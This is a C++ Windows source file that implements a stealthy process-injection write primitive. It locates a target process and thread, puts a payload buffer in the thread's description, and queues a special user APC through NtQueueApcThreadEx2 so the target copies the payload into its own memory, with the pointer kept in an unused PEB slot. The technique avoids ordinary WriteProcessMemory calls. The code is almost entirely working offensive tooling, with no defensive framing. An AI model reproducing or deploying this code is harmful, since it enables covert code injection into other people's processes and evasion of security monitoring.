#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <iomanip>

using namespace std;

typedef PVOID PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx2_FIXED)(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle,
    _In_ ULONG ApcFlags,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );

typedef NTSTATUS(WINAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
    HANDLE ThreadHandle,
    HANDLE ReserveHandle,
    ULONG ApcFlags,
    PPS_APC_ROUTINE ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
    );

// Helper function to print addresses in both standard and x64dbg formats
void print_address(const char* label, ULONG_PTR address)
{
    cout << label << ":\n";
    cout << "    Standard : 0x" << hex << uppercase << address << "\n";

    // x64dbg format: always 16 hex digits, padded with zeros
    cout << "    x64dbg   : ";
    cout << setfill('0') << setw(16) << hex << uppercase << address << "\n";
    cout << dec << setfill(' '); // reset
}

bool _NtQueueApcThreadEx2(HANDLE hThread, void* func, void* arg0, void* arg1, void* arg2)
{
    resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

    DWORD res = fNtQueueApcThreadEx2(hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, (PPS_APC_ROUTINE)func, (void*)arg0, (void*)arg1, (arg2));
    return true;
}

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

ULONG_PTR GetRemotePEBAddr(IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;

    auto pNtQueryInformationProcess = reinterpret_cast<decltype(&NtQueryInformationProcess)>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess"));
    if (!pNtQueryInformationProcess) {
        return NULL;
    }
    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    return (ULONG_PTR)pi.PebBaseAddress;
}

void* getPEBUnused(HANDLE hProcess)
{
    ULONG_PTR peb_addr = GetRemotePEBAddr(hProcess);
    if (!peb_addr) {
        std::cerr << "Cannot retrieve PEB address!\n";
        return nullptr;
    }
    const ULONG_PTR UNUSED_OFFSET = 0x340;
    const ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;
    return (void*)remotePtr;
}

// Case-insensitive string comparison helper
bool CaseInsensitiveCompare(const std::wstring& str1, const std::wstring& str2) {
    if (str1.length() != str2.length()) {
        return false;
    }
    return _wcsicmp(str1.c_str(), str2.c_str()) == 0;
}

DWORD GetPIDByProcname(const std::wstring& processName) {
    // Load ntdll.dll and get NtQuerySystemInformation
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return 0;
    }

    PFN_NT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation =
        (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        return 0;
    }

    // Start with an initial buffer size
    ULONG bufferSize = 0x10000; // 64KB initial size
    std::vector<BYTE> buffer;
    NTSTATUS status;

    // Query with increasing buffer size until successful
    do {
        buffer.resize(bufferSize);
        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.data(),
            bufferSize,
            &bufferSize
        );

        if (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            bufferSize *= 2;
        }
    } while (status == 0xC0000004 && bufferSize <= 0x1000000); // Max 16MB

    if (status != 0) { // STATUS_SUCCESS
        return 0;
    }

    // Iterate through processes
    PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer.data();

    while (true) {
        if (processInfo->ImageName.Buffer != nullptr) {
            std::wstring currentProcessName(
                processInfo->ImageName.Buffer,
                processInfo->ImageName.Length / sizeof(WCHAR)
            );

            // Case-insensitive comparison
            if (CaseInsensitiveCompare(currentProcessName, processName)) {
                return (DWORD)(ULONG_PTR)processInfo->UniqueProcessId;
            }
        }
        // Move to next process
        if (processInfo->NextEntryOffset == 0) {
            break;
        }
        processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
    }

    return 0; // Process not found
}

HANDLE findThread(HANDLE hProcess, DWORD desiredAccess) {
    DWORD pid = GetProcessId(hProcess);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return INVALID_HANDLE_VALUE;
    }
    do {
        if (te32.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(desiredAccess, FALSE, te32.th32ThreadID);
            if (hThread) {
                CloseHandle(hSnapshot);
                return hThread;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));
    CloseHandle(hSnapshot);
    return INVALID_HANDLE_VALUE;
}

LPVOID CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, size_t payload_size, LPVOID remotePtr) {
    HANDLE hThread = findThread(hProcess, SYNCHRONIZE | THREAD_SET_LIMITED_INFORMATION | THREAD_SET_CONTEXT);

    if (hThread == INVALID_HANDLE_VALUE) {
        std::cerr << "Cannot find a thread in the target process!\n";
        return nullptr;
    }

    HRESULT hr = SetThreadDescription(hThread, (PCWSTR)payload);
    if (FAILED(hr)) {
        std::cerr << "SetThreadDescription failed! HRESULT: 0x" << std::hex << hr << "\n";
        CloseHandle(hThread);
        return nullptr;
    }

    if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), remotePtr, nullptr)) {
        std::cerr << "Failed to queue APC\n";
        CloseHandle(hThread);
        return nullptr;
    }

    CloseHandle(hThread);

    Sleep(1500);

    ULONG_PTR realPayloadPtr = 0;
    if (!ReadProcessMemory(hProcess, remotePtr, &realPayloadPtr, sizeof(realPayloadPtr), nullptr)) {
        std::cerr << "Failed to read pointer from PEB. GLE: " << GetLastError() << "\n";
        return nullptr;
    }

    if (!realPayloadPtr) {
        std::cerr << "APC executed but returned NULL pointer\n";
        return nullptr;
    }

    //// Dump copied payload bytes from remote heap
    //std::vector<BYTE> dumpBuf(payload_size);

    //if (!ReadProcessMemory(
    //    hProcess,
    //    (LPCVOID)realPayloadPtr,
    //    dumpBuf.data(),
    //    dumpBuf.size(),
    //    nullptr))
    //{
    //    std::cerr << "Failed to read payload bytes. GLE: "
    //        << GetLastError() << "\n";
    //    return nullptr;
    //}

    //std::cout << "[+] Copied payload bytes at 0x"
    //    << std::hex << realPayloadPtr << ":\n";

    //for (size_t i = 0; i < dumpBuf.size(); i++) {
    //    printf("%02X ", dumpBuf[i]);
    //    if ((i + 1) % 16 == 0)
    //        printf("\n");
    //}
    //printf("\n");


    return (LPVOID)realPayloadPtr;
}